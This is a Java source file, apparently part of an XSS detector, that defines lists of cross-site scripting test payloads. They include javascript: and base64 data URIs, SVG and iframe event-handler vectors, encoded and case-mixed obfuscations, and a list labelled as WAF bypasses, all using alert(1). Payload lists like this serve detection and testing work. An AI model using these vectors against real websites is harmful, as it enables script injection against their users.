package com.xssdetector;

import java.util.List;
import java.util.Arrays;

public class AdvancedPayloads {
    public static final List<String> DOM_XSS_PAYLOADS = Arrays.asList(
        "javascript:eval('alert(1)')",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox(1)"
    );

    public static final List<String> HTML5_VECTORS = Arrays.asList(
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<video><source onerror=\"javascript:alert(1)\">"
    );

    public static final List<String> OBFUSCATION_TECHNIQUES = Arrays.asList(
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "jAvAsCrIpT:alert(1)"
    );

    public static final List<String> WAF_BYPASSES = Arrays.asList(
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<a href=javascript:alert(1)>click</a>"
    );
}
